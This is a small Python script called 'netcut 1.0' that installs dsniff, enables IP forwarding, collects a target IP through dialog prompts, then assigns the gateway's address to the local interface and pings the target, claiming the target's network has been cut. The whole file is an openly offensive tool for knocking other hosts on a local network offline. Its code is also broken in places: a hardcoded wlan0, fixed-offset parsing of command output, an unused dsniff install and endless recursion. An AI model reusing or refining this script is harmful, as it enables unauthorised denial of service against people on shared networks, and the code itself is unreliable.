#!/usr/bin/python3

import os
import sys
os.system('dialog --msgbox " netcut 1.0 " 10 30')
os.system('sleep 1')
os.system('apt-get install dsniff -y')
os.system('dialog --inputbox "enter the interface" 10 30 2> /tmp/interface' )
os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
i=open('/tmp/interface')
interface=i.read(5)
#for gateway

	
os.system('netstat -nr | grep UG > /tmp/gateway')
os.system('awk \'{print $2}\' /tmp/gateway >/tmp/gateway2')
g=open('/tmp/gateway2')
gateway=g.read(15)

os.system('ifconfig wlan0 | grep inet |grep Mask > /tmp/ipaddress')
ip=open('/tmp/ipaddress')
ip_addr=ip.read(32)
ip_address=ip_addr[20:32]
#print(ip_address)
def netcut():
	os.system('dialog --menu "choose options" 20 40 10   "1" "netcut for single target" 2>  /tmp/netchoice')
	net_ch=open('/tmp/netchoice')
	net_cut_choice=net_ch.read(1)

			
	if net_cut_choice=='1':
		os.system('dialog --inputbox "enter the target\'s ip address" 10 30 2> /tmp/target' )
		t=open('/tmp/target')
		target=t.read(15)
		
		
		os.system('ifconfig {}  {}' .format(interface,gateway))
		os.system('ping {}' .format(target))
		print('net has been cut ')
		os.system('sleep 2')
		netcut()

netcut()
